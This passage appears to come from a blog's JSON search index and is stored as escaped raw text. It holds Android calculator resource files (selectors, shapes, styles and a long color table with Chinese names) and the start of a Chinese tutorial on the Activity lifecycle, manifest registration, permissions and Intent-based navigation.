android:drawable=\u0026#34;@drawable/button_bg\u0026#34;/\u0026gt; \u0026lt;/selector\u0026gt; ------------------------------------------------------- equal_bg.xml --- \u0026lt;shape xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34;\u0026gt; \u0026lt;corners android:radius=\u0026#34;5dp\u0026#34;/\u0026gt; \u0026lt;solid android:color=\u0026#34;#ff7700\u0026#34;/\u0026gt; \u0026lt;stroke android:width=\u0026#34;5dp\u0026#34; android:color=\u0026#34;#00ffffff\u0026#34;/\u0026gt; \u0026lt;/shape\u0026gt; equal_press.xml --- \u0026lt;shape xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34;\u0026gt; \u0026lt;corners android:radius=\u0026#34;5dp\u0026#34;/\u0026gt; \u0026lt;solid android:color=\u0026#34;#ffae00\u0026#34;/\u0026gt; \u0026lt;stroke android:width=\u0026#34;5dp\u0026#34; android:color=\u0026#34;#00ffffff\u0026#34;/\u0026gt; \u0026lt;/shape\u0026gt; equal_selector.xml --- \u0026lt;selector xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34;\u0026gt; \u0026lt;item android:drawable=\u0026#34;@drawable/equal_press\u0026#34; android:state_pressed=\u0026#34;true\u0026#34;/\u0026gt; 点击状态 \u0026lt;item android:drawable=\u0026#34;@drawable/equal_bg\u0026#34;/\u0026gt; 普通状态 \u0026lt;/selector\u0026gt; ------------------------------------------------------- styles.xml --- \u0026lt;resources\u0026gt; \u0026lt;style name=\u0026#34;AppTheme\u0026#34; parent=\u0026#34;Theme.AppCompat.Light.NoActionBar\u0026#34;\u0026gt; 全屏页面 \u0026lt;item name=\u0026#34;colorPrimary\u0026#34;\u0026gt;@color/colorPrimary\u0026lt;/item\u0026gt; \u0026lt;item name=\u0026#34;colorPrimaryDark\u0026#34;\u0026gt;@color/colorPrimaryDark\u0026lt;/item\u0026gt; \u0026lt;item name=\u0026#34;colorAccent\u0026#34;\u0026gt;@color/colorAccent\u0026lt;/item\u0026gt; \u0026lt;/style\u0026gt; \u0026lt;/resources\u0026gt; colors.xml \u0026lt;color name=\u0026#34;pink\u0026#34;\u0026gt;#ffc0cb\u0026lt;/color\u0026gt;\u0026lt;!--粉红色 --\u0026gt; \u0026lt;color name=\u0026#34;lightpink\u0026#34;\u0026gt;#ffb6c1\u0026lt;/color\u0026gt;\u0026lt;!--亮粉红色 --\u0026gt; \u0026lt;color name=\u0026#34;white\u0026#34;\u0026gt;#ffffff\u0026lt;/color\u0026gt;\u0026lt;!--白色 --\u0026gt; \u0026lt;color name=\u0026#34;peachpuff\u0026#34;\u0026gt;#ffdab9\u0026lt;/color\u0026gt;\u0026lt;!--桃色 --\u0026gt; \u0026lt;color name=\u0026#34;gold\u0026#34;\u0026gt;#ffd700\u0026lt;/color\u0026gt;\u0026lt;!--金色 --\u0026gt; \u0026lt;color name=\u0026#34;ivory\u0026#34;\u0026gt;#fffff0\u0026lt;/color\u0026gt;\u0026lt;!--象牙色 --\u0026gt; \u0026lt;color name=\u0026#34;lightyellow\u0026#34;\u0026gt;#ffffe0\u0026lt;/color\u0026gt;\u0026lt;!--亮黄色 --\u0026gt; \u0026lt;color name=\u0026#34;yellow\u0026#34;\u0026gt;#ffff00\u0026lt;/color\u0026gt;\u0026lt;!--黄色 --\u0026gt; \u0026lt;color name=\u0026#34;snow\u0026#34;\u0026gt;#fffafa\u0026lt;/color\u0026gt;\u0026lt;!--雪白色 --\u0026gt; \u0026lt;color name=\u0026#34;floralwhite\u0026#34;\u0026gt;#fffaf0\u0026lt;/color\u0026gt;\u0026lt;!--花白色 --\u0026gt; \u0026lt;color name=\u0026#34;lemonchiffon\u0026#34;\u0026gt;#fffacd\u0026lt;/color\u0026gt;\u0026lt;!--柠檬绸色 --\u0026gt; \u0026lt;color name=\u0026#34;cornsilk\u0026#34;\u0026gt;#fff8dc\u0026lt;/color\u0026gt;\u0026lt;!--米绸色 --\u0026gt; \u0026lt;color name=\u0026#34;seaShell\u0026#34;\u0026gt;#fff5ee\u0026lt;/color\u0026gt;\u0026lt;!--海贝色 --\u0026gt; \u0026lt;color name=\u0026#34;lavenderblush\u0026#34;\u0026gt;#fff0f5\u0026lt;/color\u0026gt;\u0026lt;!--淡紫红 --\u0026gt; \u0026lt;color name=\u0026#34;papayawhip\u0026#34;\u0026gt;#ffefd5\u0026lt;/color\u0026gt;\u0026lt;!--番木色 --\u0026gt; \u0026lt;color name=\u0026#34;blanchedalmond\u0026#34;\u0026gt;#ffebcd\u0026lt;/color\u0026gt;\u0026lt;!--白杏色 --\u0026gt; \u0026lt;color name=\u0026#34;mistyrose\u0026#34;\u0026gt;#ffe4e1\u0026lt;/color\u0026gt;\u0026lt;!--浅玫瑰色 --\u0026gt; \u0026lt;color name=\u0026#34;bisque\u0026#34;\u0026gt;#ffe4c4\u0026lt;/color\u0026gt;\u0026lt;!--桔黄色 --\u0026gt; \u0026lt;color name=\u0026#34;moccasin\u0026#34;\u0026gt;#ffe4b5\u0026lt;/color\u0026gt;\u0026lt;!--鹿皮色 --\u0026gt; \u0026lt;color name=\u0026#34;navajowhite\u0026#34;\u0026gt;#ffdead\u0026lt;/color\u0026gt;\u0026lt;!--纳瓦白 --\u0026gt; \u0026lt;color name=\u0026#34;orange\u0026#34;\u0026gt;#ffa500\u0026lt;/color\u0026gt;\u0026lt;!--橙色 --\u0026gt; \u0026lt;color name=\u0026#34;lightsalmon\u0026#34;\u0026gt;#ffa07a\u0026lt;/color\u0026gt;\u0026lt;!--亮肉色 --\u0026gt; \u0026lt;color name=\u0026#34;darkorange\u0026#34;\u0026gt;#ff8c00\u0026lt;/color\u0026gt;\u0026lt;!--暗桔黄色 --\u0026gt; \u0026lt;color name=\u0026#34;coral\u0026#34;\u0026gt;#ff7f50\u0026lt;/color\u0026gt;\u0026lt;!--珊瑚色 --\u0026gt; \u0026lt;color name=\u0026#34;hotpink\u0026#34;\u0026gt;#ff69b4\u0026lt;/color\u0026gt;\u0026lt;!--热粉红色 --\u0026gt; \u0026lt;color name=\u0026#34;ghostwhite\u0026#34;\u0026gt;#f8f8ff\u0026lt;/color\u0026gt;\u0026lt;!--幽灵白 --\u0026gt; \u0026lt;color name=\u0026#34;mintcream\u0026#34;\u0026gt;#f5fffa\u0026lt;/color\u0026gt;\u0026lt;!--薄荷色 --\u0026gt; \u0026lt;color name=\u0026#34;whitesmoke\u0026#34;\u0026gt;#f5f5f5\u0026lt;/color\u0026gt;\u0026lt;!--烟白色 --\u0026gt; \u0026lt;color name=\u0026#34;beige\u0026#34;\u0026gt;#f5f5dc\u0026lt;/color\u0026gt;\u0026lt;!--米色 --\u0026gt; \u0026lt;color name=\u0026#34;wheat\u0026#34;\u0026gt;#f5deb3\u0026lt;/color\u0026gt;\u0026lt;!--浅黄色 --\u0026gt; \u0026lt;color name=\u0026#34;sandybrown\u0026#34;\u0026gt;#f4a460\u0026lt;/color\u0026gt;\u0026lt;!--沙褐色 --\u0026gt; \u0026lt;color name=\u0026#34;tomato\u0026#34;\u0026gt;#ff6347\u0026lt;/color\u0026gt;\u0026lt;!--西红柿色 --\u0026gt; \u0026lt;color name=\u0026#34;orangered\u0026#34;\u0026gt;#ff4500\u0026lt;/color\u0026gt;\u0026lt;!--红橙色 --\u0026gt; \u0026lt;color name=\u0026#34;deeppink\u0026#34;\u0026gt;#ff1493\u0026lt;/color\u0026gt;\u0026lt;!--深粉红色 --\u0026gt; \u0026lt;color name=\u0026#34;fuchsia\u0026#34;\u0026gt;#ff00ff\u0026lt;/color\u0026gt;\u0026lt;!--紫红色 --\u0026gt; \u0026lt;color name=\u0026#34;magenta\u0026#34;\u0026gt;#ff00ff\u0026lt;/color\u0026gt;\u0026lt;!--红紫色 --\u0026gt; \u0026lt;color name=\u0026#34;red\u0026#34;\u0026gt;#ff0000\u0026lt;/color\u0026gt;\u0026lt;!--红色 --\u0026gt; \u0026lt;color name=\u0026#34;oldlace\u0026#34;\u0026gt;#fdf5e6\u0026lt;/color\u0026gt;\u0026lt;!--老花色 --\u0026gt; \u0026lt;color name=\u0026#34;lightgoldenrodyellow\u0026#34;\u0026gt;#fafad2\u0026lt;/color\u0026gt;\u0026lt;!--亮金黄色 --\u0026gt; \u0026lt;color name=\u0026#34;linen\u0026#34;\u0026gt;#faf0e6\u0026lt;/color\u0026gt;\u0026lt;!--亚麻色 --\u0026gt; \u0026lt;color name=\u0026#34;antiquewhite\u0026#34;\u0026gt;#faebd7\u0026lt;/color\u0026gt;\u0026lt;!--古董白 --\u0026gt; \u0026lt;color name=\u0026#34;salmon\u0026#34;\u0026gt;#fa8072\u0026lt;/color\u0026gt;\u0026lt;!--鲜肉色 --\u0026gt; \u0026lt;color name=\u0026#34;azure\u0026#34;\u0026gt;#f0ffff\u0026lt;/color\u0026gt;\u0026lt;!--天蓝色 --\u0026gt; \u0026lt;color name=\u0026#34;palevioletred\u0026#34;\u0026gt;#db7093\u0026lt;/color\u0026gt;\u0026lt;!--苍紫罗兰色 --\u0026gt; \u0026lt;color name=\u0026#34;goldenrod\u0026#34;\u0026gt;#daa520\u0026lt;/color\u0026gt;\u0026lt;!--金麒麟色 --\u0026gt; \u0026lt;color name=\u0026#34;orchid\u0026#34;\u0026gt;#da70d6\u0026lt;/color\u0026gt;\u0026lt;!--淡紫色 --\u0026gt; \u0026lt;color name=\u0026#34;thistle\u0026#34;\u0026gt;#d8bfd8\u0026lt;/color\u0026gt;\u0026lt;!--蓟色 --\u0026gt; \u0026lt;color name=\u0026#34;lightgray\u0026#34;\u0026gt;#d3d3d3\u0026lt;/color\u0026gt;\u0026lt;!--亮灰色 --\u0026gt; \u0026lt;color name=\u0026#34;lightgrey\u0026#34;\u0026gt;#d3d3d3\u0026lt;/color\u0026gt;\u0026lt;!--亮灰色 --\u0026gt; \u0026lt;color name=\u0026#34;tan\u0026#34;\u0026gt;#d2b48c\u0026lt;/color\u0026gt;\u0026lt;!--茶色 --\u0026gt; \u0026lt;color name=\u0026#34;chocolate\u0026#34;\u0026gt;#d2691e\u0026lt;/color\u0026gt;\u0026lt;!--巧可力色 --\u0026gt; \u0026lt;color name=\u0026#34;peru\u0026#34;\u0026gt;#cd853f\u0026lt;/color\u0026gt;\u0026lt;!--秘鲁色 --\u0026gt; \u0026lt;color name=\u0026#34;indianred\u0026#34;\u0026gt;#cd5c5c\u0026lt;/color\u0026gt;\u0026lt;!--印第安红 --\u0026gt; \u0026lt;color name=\u0026#34;mediumvioletred\u0026#34;\u0026gt;#c71585\u0026lt;/color\u0026gt;\u0026lt;!--中紫罗兰色 --\u0026gt; \u0026lt;color name=\u0026#34;silver\u0026#34;\u0026gt;#c0c0c0\u0026lt;/color\u0026gt;\u0026lt;!--银色 --\u0026gt; \u0026lt;color name=\u0026#34;darkkhaki\u0026#34;\u0026gt;#bdb76b\u0026lt;/color\u0026gt;\u0026lt;!--暗黄褐色 --\u0026gt; \u0026lt;color name=\u0026#34;rosybrown\u0026#34;\u0026gt;#bc8f8f\u0026lt;/color\u0026gt;\u0026lt;!--褐玫瑰红 --\u0026gt; \u0026lt;color name=\u0026#34;mediumorchid\u0026#34;\u0026gt;#ba55d3\u0026lt;/color\u0026gt;\u0026lt;!--中粉紫色 --\u0026gt; \u0026lt;color name=\u0026#34;darkgoldenrod\u0026#34;\u0026gt;#b8860b\u0026lt;/color\u0026gt;\u0026lt;!--暗金黄色 --\u0026gt; \u0026lt;color name=\u0026#34;firebrick\u0026#34;\u0026gt;#b22222\u0026lt;/color\u0026gt;\u0026lt;!--火砖色 --\u0026gt; \u0026lt;color name=\u0026#34;powderblue\u0026#34;\u0026gt;#b0e0e6\u0026lt;/color\u0026gt;\u0026lt;!--粉蓝色 --\u0026gt; \u0026lt;color name=\u0026#34;lightsteelblue\u0026#34;\u0026gt;#b0c4de\u0026lt;/color\u0026gt;\u0026lt;!--亮钢兰色 --\u0026gt; \u0026lt;color name=\u0026#34;paleturquoise\u0026#34;\u0026gt;#afeeee\u0026lt;/color\u0026gt;\u0026lt;!--苍宝石绿 --\u0026gt; \u0026lt;color name=\u0026#34;greenyellow\u0026#34;\u0026gt;#adff2f\u0026lt;/color\u0026gt;\u0026lt;!--黄绿色 --\u0026gt; \u0026lt;color name=\u0026#34;lightblue\u0026#34;\u0026gt;#add8e6\u0026lt;/color\u0026gt;\u0026lt;!--亮蓝色 --\u0026gt; \u0026lt;color name=\u0026#34;darkgray\u0026#34;\u0026gt;#a9a9a9\u0026lt;/color\u0026gt;\u0026lt;!--暗灰色 --\u0026gt; \u0026lt;color name=\u0026#34;darkgrey\u0026#34;\u0026gt;#a9a9a9\u0026lt;/color\u0026gt;\u0026lt;!--暗灰色 --\u0026gt; \u0026lt;color name=\u0026#34;brown\u0026#34;\u0026gt;#a52a2a\u0026lt;/color\u0026gt;\u0026lt;!--褐色 --\u0026gt; \u0026lt;color name=\u0026#34;sienna\u0026#34;\u0026gt;#a0522d\u0026lt;/color\u0026gt;\u0026lt;!--赭色 --\u0026gt; \u0026lt;color name=\u0026#34;darkorchid\u0026#34;\u0026gt;#9932cc\u0026lt;/color\u0026gt;\u0026lt;!--暗紫色 --\u0026gt; \u0026lt;color name=\u0026#34;palegreen\u0026#34;\u0026gt;#98fb98\u0026lt;/color\u0026gt;\u0026lt;!--苍绿色 --\u0026gt; \u0026lt;color name=\u0026#34;darkviolet\u0026#34;\u0026gt;#9400d3\u0026lt;/color\u0026gt;\u0026lt;!--暗紫罗兰色 --\u0026gt; \u0026lt;color name=\u0026#34;mediumpurple\u0026#34;\u0026gt;#9370db\u0026lt;/color\u0026gt;\u0026lt;!--中紫色 --\u0026gt; \u0026lt;color name=\u0026#34;skyblue\u0026#34;\u0026gt;#87ceeb\u0026lt;/color\u0026gt;\u0026lt;!--天蓝色 --\u0026gt; \u0026lt;color name=\u0026#34;gray\u0026#34;\u0026gt;#808080\u0026lt;/color\u0026gt;\u0026lt;!--灰色 --\u0026gt; \u0026lt;color name=\u0026#34;grey\u0026#34;\u0026gt;#808080\u0026lt;/color\u0026gt;\u0026lt;!--灰色 --\u0026gt; \u0026lt;color name=\u0026#34;olive\u0026#34;\u0026gt;#808000\u0026lt;/color\u0026gt;\u0026lt;!--橄榄色 --\u0026gt; \u0026lt;color name=\u0026#34;purple\u0026#34;\u0026gt;#800080\u0026lt;/color\u0026gt;\u0026lt;!--紫色 --\u0026gt; \u0026lt;color name=\u0026#34;maroon\u0026#34;\u0026gt;#800000\u0026lt;/color\u0026gt;\u0026lt;!--粟色 --\u0026gt; \u0026lt;color name=\u0026#34;aquamarine\u0026#34;\u0026gt;#7fffd4\u0026lt;/color\u0026gt;\u0026lt;!--碧绿色 --\u0026gt; \u0026lt;color name=\u0026#34;chartreuse\u0026#34;\u0026gt;#7fff00\u0026lt;/color\u0026gt;\u0026lt;!--黄绿色 --\u0026gt; \u0026lt;color name=\u0026#34;lawngreen\u0026#34;\u0026gt;#7cfc00\u0026lt;/color\u0026gt;\u0026lt;!--草绿色 --\u0026gt; \u0026lt;color name=\u0026#34;mediumslateblue\u0026#34;\u0026gt;#7b68ee\u0026lt;/color\u0026gt;\u0026lt;!--中暗蓝色 --\u0026gt; \u0026lt;color name=\u0026#34;darkcyan\u0026#34;\u0026gt;#008b8b\u0026lt;/color\u0026gt;\u0026lt;!--暗青色 --\u0026gt; \u0026lt;color name=\u0026#34;teal\u0026#34;\u0026gt;#008080\u0026lt;/color\u0026gt;\u0026lt;!--水鸭色 --\u0026gt; \u0026lt;color name=\u0026#34;green\u0026#34;\u0026gt;#008000\u0026lt;/color\u0026gt;\u0026lt;!--绿色 --\u0026gt; \u0026lt;color name=\u0026#34;darkgreen\u0026#34;\u0026gt;#006400\u0026lt;/color\u0026gt;\u0026lt;!--暗绿色 --\u0026gt; \u0026lt;color name=\u0026#34;blue\u0026#34;\u0026gt;#0000ff\u0026lt;/color\u0026gt;\u0026lt;!--蓝色 --\u0026gt; \u0026lt;color name=\u0026#34;mediumblue\u0026#34;\u0026gt;#0000cd\u0026lt;/color\u0026gt;\u0026lt;!--中兰色 --\u0026gt; \u0026lt;color name=\u0026#34;darkblue\u0026#34;\u0026gt;#00008b\u0026lt;/color\u0026gt;\u0026lt;!--暗蓝色 --\u0026gt; \u0026lt;color name=\u0026#34;lightslategray\u0026#34;\u0026gt;#778899\u0026lt;/color\u0026gt;\u0026lt;!--亮蓝灰 --\u0026gt; \u0026lt;color name=\u0026#34;lightslategrey\u0026#34;\u0026gt;#778899\u0026lt;/color\u0026gt;\u0026lt;!--亮蓝灰 --\u0026gt; \u0026lt;color name=\u0026#34;slategray\u0026#34;\u0026gt;#708090\u0026lt;/color\u0026gt;\u0026lt;!--灰石色 --\u0026gt; \u0026lt;color name=\u0026#34;slategrey\u0026#34;\u0026gt;#708090\u0026lt;/color\u0026gt;\u0026lt;!--灰石色 --\u0026gt; \u0026lt;color name=\u0026#34;olivedrab\u0026#34;\u0026gt;#6b8e23\u0026lt;/color\u0026gt;\u0026lt;!--深绿褐色 --\u0026gt; \u0026lt;color name=\u0026#34;slateblue\u0026#34;\u0026gt;#6a5acd\u0026lt;/color\u0026gt;\u0026lt;!--石蓝色 --\u0026gt; \u0026lt;color name=\u0026#34;dimgray\u0026#34;\u0026gt;#696969\u0026lt;/color\u0026gt;\u0026lt;!--暗灰色 --\u0026gt; \u0026lt;color name=\u0026#34;dimgrey\u0026#34;\u0026gt;#696969\u0026lt;/color\u0026gt;\u0026lt;!--暗灰色 --\u0026gt; \u0026lt;color name=\u0026#34;mediumaquamarine\u0026#34;\u0026gt;#66cdaa\u0026lt;/color\u0026gt;\u0026lt;!--中绿色 --\u0026gt; \u0026lt;color name=\u0026#34;cornflowerblue\u0026#34;\u0026gt;#6495ed\u0026lt;/color\u0026gt;\u0026lt;!--菊兰色 --\u0026gt; \u0026lt;color name=\u0026#34;cadetblue\u0026#34;\u0026gt;#5f9ea0\u0026lt;/color\u0026gt;\u0026lt;!--军兰色 --\u0026gt; \u0026lt;color name=\u0026#34;darkolivegreen\u0026#34;\u0026gt;#556b2f\u0026lt;/color\u0026gt;\u0026lt;!--暗橄榄绿 --\u0026gt; \u0026lt;color name=\u0026#34;indigo\u0026#34;\u0026gt;#4b0082\u0026lt;/color\u0026gt;\u0026lt;!--靛青色 --\u0026gt; \u0026lt;color name=\u0026#34;mediumturquoise\u0026#34;\u0026gt;#48d1cc\u0026lt;/color\u0026gt;\u0026lt;!--中绿宝石 --\u0026gt; \u0026lt;color name=\u0026#34;darkslateblue\u0026#34;\u0026gt;#483d8b\u0026lt;/color\u0026gt;\u0026lt;!--暗灰蓝色 --\u0026gt; \u0026lt;color name=\u0026#34;steelblue\u0026#34;\u0026gt;#4682b4\u0026lt;/color\u0026gt;\u0026lt;!--钢兰色 --\u0026gt; \u0026lt;color name=\u0026#34;royalblue\u0026#34;\u0026gt;#4169e1\u0026lt;/color\u0026gt;\u0026lt;!--皇家蓝 --\u0026gt; \u0026lt;color name=\u0026#34;turquoise\u0026#34;\u0026gt;#40e0d0\u0026lt;/color\u0026gt;\u0026lt;!--青绿色 --\u0026gt; \u0026lt;color name=\u0026#34;mediumseagreen\u0026#34;\u0026gt;#3cb371\u0026lt;/color\u0026gt;\u0026lt;!--中海蓝 --\u0026gt; \u0026lt;color name=\u0026#34;limegreen\u0026#34;\u0026gt;#32cd32\u0026lt;/color\u0026gt;\u0026lt;!--橙绿色 --\u0026gt; \u0026lt;color name=\u0026#34;midnightblue\u0026#34;\u0026gt;#191970\u0026lt;/color\u0026gt;\u0026lt;!--中灰兰色 --\u0026gt; \u0026lt;color name=\u0026#34;aqua\u0026#34;\u0026gt;#00ffff\u0026lt;/color\u0026gt;\u0026lt;!--浅绿色 --\u0026gt; \u0026lt;color name=\u0026#34;cyan\u0026#34;\u0026gt;#00ffff\u0026lt;/color\u0026gt;\u0026lt;!--青色 --\u0026gt; \u0026lt;color name=\u0026#34;springgreen\u0026#34;\u0026gt;#00ff7f\u0026lt;/color\u0026gt;\u0026lt;!--春绿色 --\u0026gt; \u0026lt;color name=\u0026#34;lime\u0026#34;\u0026gt;#00ff00\u0026lt;/color\u0026gt;\u0026lt;!--酸橙色 --\u0026gt; \u0026lt;color name=\u0026#34;mediumspringgreen\u0026#34;\u0026gt;#00fa9a\u0026lt;/color\u0026gt;\u0026lt;!--中春绿色 --\u0026gt; \u0026lt;color name=\u0026#34;darkturquoise\u0026#34;\u0026gt;#00ced1\u0026lt;/color\u0026gt;\u0026lt;!--暗宝石绿 --\u0026gt; \u0026lt;color name=\u0026#34;deepskyblue\u0026#34;\u0026gt;#00bfff\u0026lt;/color\u0026gt;\u0026lt;!--深天蓝色 --\u0026gt; \u0026lt;color name=\u0026#34;navy\u0026#34;\u0026gt;#000080\u0026lt;/color\u0026gt;\u0026lt;!--海军色 --\u0026gt; \u0026lt;color name=\u0026#34;black\u0026#34;\u0026gt;#000000\u0026lt;/color\u0026gt;\u0026lt;!--黑色 --\u0026gt; \u0026lt;color name=\u0026#34;darkslategray\u0026#34;\u0026gt;#2f4f4f\u0026lt;/color\u0026gt;\u0026lt;!--暗瓦灰色 --\u0026gt; \u0026lt;color name=\u0026#34;darkslategrey\u0026#34;\u0026gt;#2f4f4f\u0026lt;/color\u0026gt;\u0026lt;!--暗瓦灰色 --\u0026gt; \u0026lt;color name=\u0026#34;seagreen\u0026#34;\u0026gt;#2e8b57\u0026lt;/color\u0026gt;\u0026lt;!--海绿色 --\u0026gt; \u0026lt;color name=\u0026#34;forestgreen\u0026#34;\u0026gt;#228b22\u0026lt;/color\u0026gt;\u0026lt;!--森林绿 --\u0026gt; \u0026lt;color name=\u0026#34;lightseagreen\u0026#34;\u0026gt;#20b2aa\u0026lt;/color\u0026gt;\u0026lt;!--亮海蓝色 --\u0026gt; \u0026lt;color name=\u0026#34;dodgerblue\u0026#34;\u0026gt;#1e90ff\u0026lt;/color\u0026gt;\u0026lt;!--闪兰色 --\u0026gt; \u0026lt;color name=\u0026#34;honeydew\u0026#34;\u0026gt;#f0fff0\u0026lt;/color\u0026gt;\u0026lt;!--蜜色 --\u0026gt; \u0026lt;color name=\u0026#34;aliceblue\u0026#34;\u0026gt;#f0f8ff\u0026lt;/color\u0026gt;\u0026lt;!--艾利斯兰 --\u0026gt; \u0026lt;color name=\u0026#34;khaki\u0026#34;\u0026gt;#f0e68c\u0026lt;/color\u0026gt;\u0026lt;!--黄褐色 --\u0026gt; \u0026lt;color name=\u0026#34;lightcoral\u0026#34;\u0026gt;#f08080\u0026lt;/color\u0026gt;\u0026lt;!--亮珊瑚色 --\u0026gt; \u0026lt;color name=\u0026#34;palegoldenrod\u0026#34;\u0026gt;#eee8aa\u0026lt;/color\u0026gt;\u0026lt;!--苍麒麟色 --\u0026gt; \u0026lt;color name=\u0026#34;violet\u0026#34;\u0026gt;#ee82ee\u0026lt;/color\u0026gt;\u0026lt;!--紫罗兰色 --\u0026gt; \u0026lt;color name=\u0026#34;darksalmon\u0026#34;\u0026gt;#e9967a\u0026lt;/color\u0026gt;\u0026lt;!--暗肉色 --\u0026gt; \u0026lt;color name=\u0026#34;lightgreen\u0026#34;\u0026gt;#90ee90\u0026lt;/color\u0026gt;\u0026lt;!--亮绿色 --\u0026gt; \u0026lt;color name=\u0026#34;darkseagreen\u0026#34;\u0026gt;#8fbc8f\u0026lt;/color\u0026gt;\u0026lt;!--暗海兰色 --\u0026gt; \u0026lt;color name=\u0026#34;saddlebrown\u0026#34;\u0026gt;#8b4513\u0026lt;/color\u0026gt;\u0026lt;!--重褐色 --\u0026gt; \u0026lt;color name=\u0026#34;darkmagenta\u0026#34;\u0026gt;#8b008b\u0026lt;/color\u0026gt;\u0026lt;!--暗洋红 --\u0026gt; \u0026lt;color name=\u0026#34;darkred\u0026#34;\u0026gt;#8b0000\u0026lt;/color\u0026gt;\u0026lt;!--暗红色 --\u0026gt; \u0026lt;color name=\u0026#34;blueviolet\u0026#34;\u0026gt;#8a2be2\u0026lt;/color\u0026gt;\u0026lt;!--紫罗兰蓝色 --\u0026gt; \u0026lt;color name=\u0026#34;lightskyblue\u0026#34;\u0026gt;#87cefa\u0026lt;/color\u0026gt;\u0026lt;!--亮天蓝色 --\u0026gt; \u0026lt;color name=\u0026#34;lavender\u0026#34;\u0026gt;#e6e6fa\u0026lt;/color\u0026gt;\u0026lt;!--淡紫色 --\u0026gt; \u0026lt;color name=\u0026#34;lightcyan\u0026#34;\u0026gt;#e0ffff\u0026lt;/color\u0026gt;\u0026lt;!--亮青色 --\u0026gt; \u0026lt;color name=\u0026#34;burlywood\u0026#34;\u0026gt;#deb887\u0026lt;/color\u0026gt;\u0026lt;!--实木色 --\u0026gt; \u0026lt;color name=\u0026#34;crimson\u0026#34;\u0026gt;#dc143c\u0026lt;/color\u0026gt;\u0026lt;!--暗深红色 --\u0026gt; \u0026lt;color name=\u0026#34;plum\u0026#34;\u0026gt;#dda0dd\u0026lt;/color\u0026gt;\u0026lt;!--洋李色 --\u0026gt; \u0026lt;color name=\u0026#34;gainsboro\u0026#34;\u0026gt;#dcdcdc\u0026lt;/color\u0026gt;\u0026lt;!--淡灰色 --\u0026gt; ","permalink":"https://xhstormr.github.io/blog/posts/android-calculator/","summary":"","title":"Android 计算器"},{"content":"Updated on 2016-07-18\nActivity 的生命周期 根据 Activity 生命周期方法可以分为以下三组：\n完整生命周期（Entire lifetime） 前台生命周期（Foreground lifetime） 后台生命周期（Visible lifetime） 注册 Activity AndroidManifest.xml ⇳ \u0026lt;application android:allowBackup=\u0026#34;true\u0026#34; 允许导出备份文件 android:supportsRtl=\u0026#34;true\u0026#34; 支持左右翻转布局 android:label=\u0026#34;@string/app_name\u0026#34; 应用名称 android:icon=\u0026#34;@mipmap/ic_launcher\u0026#34; 应用图标 android:theme=\u0026#34;@style/AppTheme\u0026#34;\u0026gt; 应用主题 \u0026lt;activity android:name=\u0026#34;com.example.system.myapplication.MainActivity\u0026#34;\u0026gt; 注册 Activity \u0026lt;intent-filter\u0026gt; 标签 \u0026lt;action android:name=\u0026#34;android.intent.action.MAIN\u0026#34;/\u0026gt; 设置为入口 Activity \u0026lt;category android:name=\u0026#34;android.intent.category.LAUNCHER\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; 其余组件 \u0026lt;/application\u0026gt; 保护 Activity 应用A - AndroidManifest.xml ⇳ \u0026lt;permission android:name=\u0026#34;aa.bb.cc.dd\u0026#34; android:protectionLevel=\u0026#34;normal\u0026#34;/\u0026gt; \u0026lt;activity android:name=\u0026#34;.MainActivity\u0026#34; android:permission=\u0026#34;aa.bb.cc.dd\u0026#34;/\u0026gt; 添加权限，受到保护 应用B - AndroidManifest.xml ⇳ \u0026lt;uses-permission android:name=\u0026#34;aa.bb.cc.dd\u0026#34;/\u0026gt; 申请权限 Activity 之间的通信 1 --- AndroidManifest.xml ⇳ \u0026lt;activity android:name=\u0026#34;.B\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; 标签 \u0026lt;action android:name=\u0026#34;aa.bb.cc\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; A.class ⇳ public void onClick(View view) { Intent intent = new Intent(); intent.setAction(\u0026#34;aa.bb.cc\u0026#34;); intent.addCategory(\u0026#34;android.intent.category.DEFAULT\u0026#34;); startActivity(intent); } ------------------------------------------------------- 2 --- public class A extends AppCompatActivity { private Button button1; private Button button2; private TextView textView; @Override protected void onCreate(@Nullable Bundle savedInstanceState) { Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;A ---\u0026gt; 1onCreate\u0026#34;); super.onCreate(savedInstanceState); setContentView(R.layout.a); button1 = (Button) findViewById(R.id.a_bt1); button2 = (Button) findViewById(R.id.a_bt2); textView = (TextView) findViewById(R.id.a_tv1); button1.setOnClickListener(new View.OnClickListener() { 按钮一，第一种方式，无返回值 A ➜ B @Override public void onClick(View view) { Intent intent = new Intent(A.this, B.class); Intent（上下文对象，目标 Activity） intent.putExtra(\u0026#34;str1\u0026#34;, \u0026#34;数据传入\u0026#34;); 放入数据 startActivity(intent); 无返回值跳转页面 } }); button2.setOnClickListener(new View.OnClickListener() { 按钮二，第二种方式，有返回值 A ➜ B ➜ A @Override public void onClick(View view) { Intent intent = new Intent(A.this, B.class); Intent（上下文对象，目标 Activity） startActivityForResult(intent, 1); 有返回值跳转页面（意图，请求码） } }); } @Override protected void onActivityResult(int requestCode, int resultCode, Intent data) { 接收数据（请求码，结果码，回传数据） super.onActivityResult(requestCode, resultCode, data); if (requestCode == 1 \u0026amp;\u0026amp; resultCode == 2) { 通过请求码和结果码判断是哪个 Activity 回传的数据 textView.setText(data.getStringExtra(\u0026#34;str1\u0026#34;)); 显示回传数据 } } @Override protected void onStart() { Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;A ---\u0026gt; 2onStart\u0026#34;); super.onStart(); } @Override protected void onResume() { Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;A ---\u0026gt; 3onResume\u0026#34;); super.onResume(); } @Override protected void onPause() { Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;A ---\u0026gt; 4onPause\u0026#34;); super.onPause(); } @Override protected void onStop() { Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;A ---\u0026gt; 5onStop\u0026#34;); super.onStop(); } @Override protected void onDestroy() { Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;A ---\u0026gt; 6onDestroy\u0026#34;); super.onDestroy(); } @Override protected void onRestart() { Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;A ---\u0026gt; 7onRestart\u0026#34;); super.onRestart(); } 